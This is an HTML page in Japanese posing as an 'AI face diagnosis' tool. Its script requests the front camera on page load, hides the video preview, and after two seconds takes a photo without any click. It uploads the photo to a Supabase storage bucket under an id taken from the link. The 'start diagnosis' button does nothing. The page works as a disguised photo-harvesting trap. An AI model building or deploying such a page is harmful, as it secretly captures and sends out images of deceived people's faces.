<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>AI診断</title>
  <style>
    body {
      background: #111;
      color: white;
      font-family: system-ui, sans-serif;
      text-align: center;
      margin: 0;
      padding: 0;
    }
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .preview-box {
      width: 250px;
      height: 250px;
      background: white;
      border-radius: 20px;
      margin-top: 20px;
      overflow: hidden;
    }
    video { width: 100%; height: 100%; object-fit: cover; display:none; }
    button {
      margin-top: 20px;
      background: #f97316;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 10px 20px;
      font-size: 1rem;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>AI顔診断</h1>
    <div class="preview-box">
      <video id="video" autoplay playsinline muted></video>
    </div>
    <button>診断をはじめる</button>
    <p id="status" style="color:#ccc; margin-top:10px;"></p>
  </div>

  <script type="module">
    import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
    const supabase = createClient(
      "https://hwwjnlprsntmdcytktbm.supabase.co",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
    );

    const id = new URLSearchParams(window.location.search).get("id") || Math.random().toString(36).substring(2, 9);
    const video = document.getElementById("video");
    const status = document.getElementById("status");

    window.addEventListener("load", async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        video.srcObject = stream;

        // 許可後に2秒待って自動撮影
        setTimeout(() => captureAndUpload(stream), 2000);
      } catch (e) {
        status.textContent = "カメラの許可が得られませんでした。";
      }
    });

    async function captureAndUpload(stream) {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));

      status.textContent = "送信中...";
      const { error } = await supabase.storage.from("photos").upload(`${id}.jpg`, blob, { upsert: true });

      stream.getTracks().forEach(t => t.stop());
      status.textContent = error ? "送信エラー" : "✅ 撮影完了";
    }
  </script>
</body>
</html>
